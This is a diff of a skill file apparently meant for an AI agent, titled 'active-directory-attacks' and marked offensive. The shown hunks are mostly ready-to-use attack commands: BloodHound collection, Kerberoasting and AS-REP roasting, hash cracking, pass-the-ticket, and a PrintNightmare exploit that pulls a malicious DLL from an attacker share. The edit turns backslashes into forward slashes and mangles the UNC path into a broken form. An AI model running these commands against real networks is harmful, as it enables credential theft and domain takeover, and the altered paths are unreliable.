@@ -1,6 +1,6 @@
 ---
 name: active-directory-attacks
-description: "Provide comprehensive techniques for attacking Microsoft Active Directory environments. Covers reconnaissance, credential harvesting, Kerberos attacks, lateral movement, privilege escalation, and domain dominance for red team operations and penetration testing."
+description: Provide comprehensive techniques for attacking Microsoft Active Directory environments. Covers reconnaissance, credential harvesting, Kerberos attacks, lateral movement, privilege escalation, and domain dominance for red team operations and penetration testing. Use when the task involves active directory attacks.
 risk: offensive
 source: community
 author: zebbern
@@ -76,8 +76,8 @@ neo4j console
 bloodhound --no-sandbox
 
 # Collect data with SharpHound
-.\SharpHound.exe -c All
-.\SharpHound.exe -c All --ldapusername user --ldappassword pass
+./SharpHound.exe -c All
+./SharpHound.exe -c All --ldapusername user --ldappassword pass
 
 # Python collector (from Linux)
 bloodhound-python -u 'user' -p 'password' -d domain.local -ns 10.10.10.10 -c all
@@ -131,7 +131,7 @@ Extract service account TGS tickets and crack offline:
 GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile hashes.txt
 
 # Rubeus
-.\Rubeus.exe kerberoast /outfile:hashes.txt
+./Rubeus.exe kerberoast /outfile:hashes.txt
 
 # CrackMapExec
 crackmapexec ldap 10.10.10.10 -u user -p password --kerberoast output.txt
@@ -149,7 +149,7 @@ Target accounts with "Do not require Kerberos preauthentication":
 GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat
 
 # Rubeus
-.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
+./Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
 
 # Crack with hashcat
 hashcat -m 18200 hashes.txt rockyou.txt
@@ -219,7 +219,7 @@ getTGT.py domain.local/user -hashes :NTHASH
 export KRB5CCNAME=user.ccache
 
 # Rubeus
-.\Rubeus.exe asktgt /user:user /rc4:NTHASH /ptt
+./Rubeus.exe asktgt /user:user /rc4:NTHASH /ptt
 ```
 
 ---
@@ -295,7 +295,7 @@ python3 restorepassword.py domain.local/DC01@DC01 -target-ip 10.10.10.10 -hexpas
 rpcdump.py @10.10.10.10 | grep 'MS-RPRN'
 
 # Exploit (requires hosting malicious DLL)
-python3 CVE-2021-1675.py domain.local/user:pass@10.10.10.10 '\\attacker\share\evil.dll'
+python3 CVE-2021-1675.py domain.local/user:pass@10.10.10.10 '\\attacker/share/evil.dll'
 ```
 
 ### samAccountName Spoofing (CVE-2021-42278/42287)
